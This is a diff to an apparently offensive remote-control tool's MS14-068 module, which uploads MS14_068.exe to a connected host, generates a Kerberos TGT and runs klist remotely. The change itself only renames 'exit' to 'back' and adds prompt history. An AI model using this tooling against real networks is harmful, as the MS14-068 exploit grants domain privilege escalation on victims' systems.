@@ -3,21 +3,23 @@ from AuxiliaryFunctions import uploadCVE
 from prompt_toolkit import prompt
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.formatted_text import ANSI
+from prompt_toolkit.history import InMemoryHistory
 
 
 def MS14068(conn, choice):
-    commands = ["exit", "upload MS14_068.exe", "exploit"]
+    commands = ["back", "upload MS14_068.exe", "exploit"]
     completer = WordCompleter(commands)
     formatted_text1 = ANSI('\033[1;1;1mMS14-068 > \033[0m')
+    history = InMemoryHistory()
     while True:
         try:
-            command0 = prompt(formatted_text1, completer=completer)
+            command0 = prompt(formatted_text1, completer=completer, history=history)
             if command0 == "":
                 continue
             elif command0.split()[0] == 'upload':
                 uploadCVE.uploadCVE(conn, command0)
                 continue
-            elif command0 == 'exit':
+            elif command0 == 'back':
                 break
             elif command0 == 'exploit':
                 print('\033[1;32;32m' + "[+] Generating TGT ticket......" + '\033[0m')
@@ -40,12 +42,13 @@ def MS14068(conn, choice):
                 print('\033[1;32;32m' + "[+] The current ticket of the system:" + '\033[0m')
                 command7 = "klist"
                 send_receive(conn, command7)
-                commands = ["exit"]
+                commands = ["back"]
                 completer = WordCompleter(commands)
                 formatted_text1 = ANSI('\033[1;1;1m> \033[0m')
+                history1 = InMemoryHistory()
                 while True:
-                    exec = prompt(formatted_text1, completer=completer)
-                    if exec == 'exit':
+                    exec = prompt(formatted_text1, completer=completer, history=history1)
+                    if exec == 'back':
                         break
                     elif exec == "":
                         continue
